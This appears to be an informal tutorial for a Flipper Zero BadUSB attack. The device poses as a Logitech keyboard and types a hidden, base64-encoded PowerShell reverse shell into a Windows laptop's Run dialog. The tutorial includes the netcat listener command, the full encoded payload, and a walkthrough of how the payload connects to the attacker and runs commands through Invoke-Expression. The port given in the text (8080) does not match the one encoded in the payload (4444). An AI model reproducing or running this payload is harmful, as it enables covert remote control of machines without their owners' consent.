Executing the attack:

For this to ork u need to listen on port 8080 with netcat 
# Listen on all interfaces, port 8080
nc -lvnp 8080
The command above starts that process do this prefreabbly on a linux full system not 
Wsl's or VM's 

This is Raw base64 translation used in the command(for nerds):

JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQA2ACIALAA0ADQANAA0ACkAOwAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAALAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgA9ACQAcwBiACsAIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwAkAHMAYgB0AD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=

Decode it in http://192.168.1.15:8081/base64-string-converter

The Process:


1. The Physical Handshake
ID 046d:c31c: The Flipper Zero tells the Samsung Book 4: "I am not a hacking tool; I am a Logitech USB Keyboard." * DELAY 3000: It waits 3 seconds for Windows to load the "keyboard" drivers. Because it’s a known Logitech ID, Windows skips the "Setting up device" notification, which keeps it discrete.

2. Opening the "Backdoor"
GUI r: The Flipper sends the keyboard shortcut Windows + R. This opens the Run dialog box.

BACKSPACE: It taps backspace just in case there was something old typed in that box, clearing the path.

STRING powershell...: It types the command faster than any human could.

-NoP: (NoProfile) Doesn't load the user's custom settings (faster).

-W Hidden: (WindowStyle Hidden) Hides the blue PowerShell window immediately so the user doesn't see it.

-Enc: (EncodedCommand) This tells PowerShell that the giant wall of text following it is a Base64 encoded script.

3. Inside the Base64 (The Logic)
Once PowerShell decodes that long string, it executes these internal steps:

The Phone Call: $c=New-Object System.Net.Sockets.TCPClient("192.168.1.16",8080)

PowerShell creates a network connection to your Zephyrus.

The Pipe: $s=$c.GetStream()

It creates a "stream"—basically an open pipe between the Samsung's brain and your terminal.

The Infinite Loop: while(($i=$s.Read(...)))

It enters a loop where it sits and waits. It listens for any text coming from your Zephyrus.

The Executioner: iex $data

This is the "magic" part. iex stands for Invoke-Expression. Whatever you type into your Zephyrus is sent through the pipe, and PowerShell runs it on the Samsung as if you were sitting right there.

The Feedback: It takes the result of your command, adds the PS C:\Users\>  prompt, and sends it back to you.

